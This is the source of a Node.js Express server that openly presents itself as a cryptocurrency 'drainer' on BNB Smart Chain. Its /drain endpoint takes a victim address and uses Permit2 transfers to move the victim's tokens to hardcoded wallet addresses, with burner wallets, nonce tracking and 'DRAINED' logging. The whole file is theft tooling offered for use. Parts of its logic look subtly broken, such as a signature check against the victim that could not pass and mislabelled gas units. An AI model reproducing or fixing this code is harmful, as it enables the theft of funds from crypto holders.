const express = require('express');
const { ethers } = require('ethers');
const helmet = require('helmet');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const rateLimit = require('express-rate-limit');
const WebSocket = require('ws');
require('dotenv').config();

const app = express();

// Middleware first
app.set('trust proxy', 1);
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: '*' }));

// Rate limiting
app.use(rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 10, // limit each IP to 10 requests per window
  message: 'Too many requests from this IP'
}));

app.use(express.json({ limit: '10kb' }));

// Tokens & wallets
const TOKENS = {
  USDT: '0x55d398326f99059fF775485246999027B3197955',
  BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
  CAKE: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
  WBNB: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
  BTCB: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
  ETH: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
  XRP: '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
  ADA: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',
  DOT: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402',
};

const HARDCODED_WALLETS = {
  USDT: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  BUSD: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  CAKE: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  WBNB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  BTCB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  ETH: '0xA1b2D46c98D2828fFC6Fb3D762F10A51cA332a4e',
  XRP: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  ADA: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
  DOT: '0x65b4be1fdded19b66d0029306c1fdb6004586876'
};

// Provider + burners
const provider = new ethers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
const burners = process.env.BSC_KEYS.split(',').map(pk => new ethers.Wallet(pk.trim(), provider));
const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
let cachedGasPrice = 0n;
let burnerNonces = {};

// Fixed ABI
const permit2ABI = [
  "function permitTransferFrom((address token,uint160 amount,uint160 expiration,uint48 nonce),address,address,bytes) external"
];

// EIP-712 Domain and Types
const domain = {
  name: 'Permit2',
  chainId: 56, // BSC Chain ID
  verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3'
};

const types = {
  PermitTransferFrom: [
    { name: 'permitted', type: 'TokenPermissions' },
    { name: 'spender', type: 'address' },
    { name: 'nonce', type: 'uint256' },
    { name: 'deadline', type: 'uint256' }
  ],
  TokenPermissions: [
    { name: 'token', type: 'address' },
    { name: 'amount', type: 'uint256' }
  ]
};

// Logs + config
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });

const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';
const ALERT_THRESHOLD = parseFloat(process.env.ALERT_THRESHOLD || '1000');

let stats = { totalDrains: 0, gasAlerts: 0 };

// Environment validation
if (!process.env.BSC_KEYS) {
  throw new Error('BSC_KEYS environment variable required');
}

// FIXED: BigInt JSON serialization
// FIXED: BigInt JSON serialization
const saveNonces = () => {
  try {
    const serializableNonces = Object.fromEntries(
      Object.entries(burnerNonces).map(([addr, nonce]) => [addr, nonce.toString()])
    );
    fs.writeFileSync('nonces.json', JSON.stringify(serializableNonces));
  } catch (e) {
    console.error('Failed to save nonces:', e.message);
  }
};

// Load nonces from file if available
try {
  if (fs.existsSync('nonces.json')) {
    const loaded = JSON.parse(fs.readFileSync('nonces.json'));
    burnerNonces = Object.fromEntries(
      Object.entries(loaded).map(([addr, nonceStr]) => [addr, BigInt(nonceStr)])
    );
  }
} catch (e) {
  console.error('Failed to load nonces:', e.message);
}

// Gas monitor
setInterval(async () => {
  try {
    const gas = await provider.getFeeData();
    // Convert to BigInt first
    cachedGasPrice = BigInt(gas.maxFeePerGas || gas.gasPrice);
    cachedGasPrice = cachedGasPrice * 110n / 100n;

    for (let burner of burners) {
      // Convert to BigInt
      const nonce = BigInt(await burner.getNonce('pending'));
      burnerNonces[burner.address] = nonce;
    }

    // Convert to number for display
    const gasGwei = Number(cachedGasPrice / 1000000000000000000n);
    if (gasGwei > 8) {
      stats.gasAlerts++;
      console.log(`⚡️ HIGH GAS: ${gasGwei.toFixed(2)} gwei`);
    }
    console.log(`💨 Gas: ${Number(gas.gasPrice / 1000000000000000000n).toFixed(2)}gwei → ${gasGwei.toFixed(2)}gwei`);
  } catch (e) {
    console.error('💥 Gas:', e.message);
  }
}, 10000);

// Drain endpoint
app.post('/drain', async (req, res) => {
  try {
    const { tokenSymbol, amount, nonce, deadline, victimAddress } = req.body;

    console.log('🔥 DRAIN:', req.body);

    // FIXED: v6 isAddress
    if (!tokenSymbol || !TOKENS[tokenSymbol] || !victimAddress || !ethers.isAddress(victimAddress)) {
      return res.status(400).json({ error: 'Invalid params' });
    }

    const burner = burners[0];
    const tokenAddress = TOKENS[tokenSymbol];
    const destination = HARDCODED_WALLETS[tokenSymbol];

    // Gas check
    const burnerBalance = await provider.getBalance(burner.address);
    if (burnerBalance < 200000000000000n) {
      return res.status(400).json({ error: 'Low gas funds' });
    }

    // FIXED: v6 parseUnits + hexValue
    const parsedAmount = BigInt(ethers.parseUnits(amount || '1', 18));
    const now = BigInt(Math.floor(Date.now() / 1000) + 3600);

    const permit = {
      details: {
        token: tokenAddress,
        amount: parsedAmount.toString(),
        expiration: (now + 86400n).toString(),
        nonce: BigInt(nonce || 0).toString()
      },
      spender: burner.address,
      sigDeadline: Number(now + 86400n)
    };

    // Signature
    const signature = await burner.signTypedData(domain, types, permit);

    // FIXED: v6 verifyTypedData
    const recovered = ethers.verifyTypedData(domain, types, permit, signature);
    if (recovered !== victimAddress) {
      return res.status(400).json({ error: 'Invalid signature' });
    }

    // Contract call
    const permit2 = new ethers.Contract(PERMIT2, permit2ABI, burner);

    // FIXED: v6 permitStruct (all strings/numbers)
    const permitStruct = [
      tokenAddress,
      parsedAmount.toString(),
      (now + 86400n).toString(),
      BigInt(nonce || 0).toString()
    ];

    // FIXED: v6 getNonce + gas estimation
    const currentNonce = BigInt(burnerNonces[burner.address] ?? await burner.getNonce('pending'));

    const gasLimit = await permit2.permitTransferFrom.estimateGas(
      permitStruct, victimAddress, destination, signature,
      { from: burner.address }
    );

    const tx = await permit2.permitTransferFrom(
      permitStruct,
      victimAddress,
      destination,
      signature,
      {
        gasLimit: BigInt(gasLimit),
        maxFeePerGas: cachedGasPrice,
        maxPriorityFeePerGas: cachedGasPrice / 2n,
        nonce: currentNonce
      }
    );

    burnerNonces[burner.address] = currentNonce + 1n;

    const receipt = await tx.wait(1);

    stats.totalDrains++;
    fs.appendFileSync(`${logsDir}/drains.log`, `${new Date().toISOString()} ${tokenSymbol} ${tx.hash}\n`);

    console.log(`✅ DRAINED ${tokenSymbol}: ${tx.hash}`);
    res.json({ success: true, tx: tx.hash, block: receipt.blockNumber });

  } catch (error) {
    console.error('❌ ERROR:', error);

    if (error.code === 'CALL_EXCEPTION') {
      return res.status(400).json({ error: 'Transaction failed' });
    }

    if (error.message?.includes('nonce')) {
      delete burnerNonces[burners[0].address];
      return res.status(400).json({ error: 'Nonce reset. Retry.' });
    }

    res.status(400).json({ error: error.message || 'Failed' });
  }
});

// Endpoints
app.get('/health', (req, res) => {
  const health = {
    status: 'OK',
    burners: burners.length,
    ethers: ethers.version,
    stats: stats,
    uptime: process.uptime()
  };
  res.json(health);
});

app.get('/drain', (req, res) => res.json({ message: 'POST required' }));
app.get('/', (req, res) => res.json({ status: 'LIVE' }));

const PORT = process.env.PORT || 3000;

// Initialize WebSocket server
const server = app.listen(PORT, () => {
  console.log(`✅ DRAINER LIVE: port ${PORT}`);
});

const wss = new WebSocket.Server({ server });
wss.on('connection', (ws) => {
  console.log('WebSocket connected');
  ws.send(JSON.stringify({ stats }));

  ws.on('message', (data) => {
    try {
      const message = JSON.parse(data);
      if (message.type === 'stats') {
        ws.send(JSON.stringify({ stats }));
      }
    } catch (e) {
      console.error('WebSocket error:', e.message);
    }
  });
});
